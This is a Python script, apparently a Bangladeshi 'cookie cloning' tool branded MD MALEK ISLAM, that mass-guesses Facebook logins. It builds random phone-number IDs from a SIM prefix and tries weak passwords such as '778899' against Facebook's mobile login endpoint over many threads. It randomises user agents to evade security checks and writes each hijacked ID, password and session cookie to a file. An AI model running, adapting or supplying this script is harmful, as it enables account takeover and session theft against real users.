import os, time, sys, uuid, random, requests, re
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# Color Codes
G = '\033[1;32m'; W = '\033[1;37m'; R = '\033[1;31m'; Y = '\033[1;33m'; B = '\033[1;34m'; P = '\033[1;35m'
loop = 0; ok = []

def banner():
    os.system('clear')
    print(f"""
{R}     ███    ███  ███████  ████████  █████  
{G}     ████  ████  ██          ██    ██   ██ 
{Y}     ██ ████ ██  █████       ██    ███████ 
{B}     ██  ██  ██  ██          ██    ██   ██ 
{P}     ██      ██  ███████     ██    ██   ██ 
{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}
| [✓] DEVELOPED BY : MD MALEK ISLAM            |
| [✓] STATUS       : REAL COOKIE CLONING       |
{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}""")

def main():
    banner()
    print(f'{G}[1] NUMBER COOKIE CLONING')
    print(f'[0] EXIT')
    choose = input(f'{Y}[▼] CHOOSE : {W}')
    if choose == '1':
        cloning_start()
    else: sys.exit()

def cloning_start():
    banner()
    code = input(f'{G}[+] ENTER SIM CODE (Ex: 0171): {W}')
    limit = int(input(f'{G}[•] PUT CLONING LIMIT: {W}'))
    
    banner()
    print(f'{G}[+] PROCESS STARTED... (SAFE MODE ON)')
    print(f'×××××××××××××××××××××××××××××××××××××××××××××××××{W}\n')

    # Balanced Workers to catch cookies
    with ThreadPool(max_workers=25) as pool:
        for _ in range(limit):
            num = str(random.randint(1111111, 9999999))
            uid = code + num
            pws = [num, uid, '778899', '556677'] # Strong PWS list
            pool.submit(login_api, uid, pws, limit)

def login_api(uid, pws, limit):
    global loop, ok
    sys.stdout.write(f'\r{G}[MALEK-RUNNING] {loop}/{limit} [OK:{len(ok)}]'); sys.stdout.flush()
    
    for pas in pws:
        session = requests.Session()
        # Randomized User Agent to bypass security
        ua = f"Mozilla/5.0 (Linux; Android {random.randint(8,13)}; V2055) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,122)}.0.{random.randint(1000,6000)}.{random.randint(10,150)} Mobile Safari/537.36"
        
        headers = {
            'authority': 'm.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://m.facebook.com',
            'referer': 'https://m.facebook.com/login/',
            'user-agent': ua,
        }
        
        url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
        data = {
            "lsd": "AVpY", 
            "jazoest": "2931", 
            "m_ts": str(time.time()),
            "email": uid, 
            "pass": pas
        }

        try:
            # Added a small delay to make it realistic
            time.sleep(0.02)
            response = session.post(url, data=data, headers=headers, timeout=30)
            
            if "c_user" in session.cookies.get_dict():
                kuki = (";").join([f"{k}={v}" for k, v in session.cookies.get_dict().items()])
                print(f'\n{G}[MALEK-OK💚] {uid} • {pas}') 
                print(f'{G}[🌺] COOKIE = {kuki}\n')
                ok.append(uid)
                with open('ok.txt', 'a') as f:
                    f.write(f'{uid}|{pas}|{kuki}\n')
                break
            elif "checkpoint" in session.cookies.get_dict():
                # print(f'\n{Y}[MALEK-CP] {uid} • {pas}') # Optional: to see CP IDs
                break
        except:
            time.sleep(1) # Wait if internet is slow
            pass
            
    loop += 1

if __name__ == "__main__":
    main()
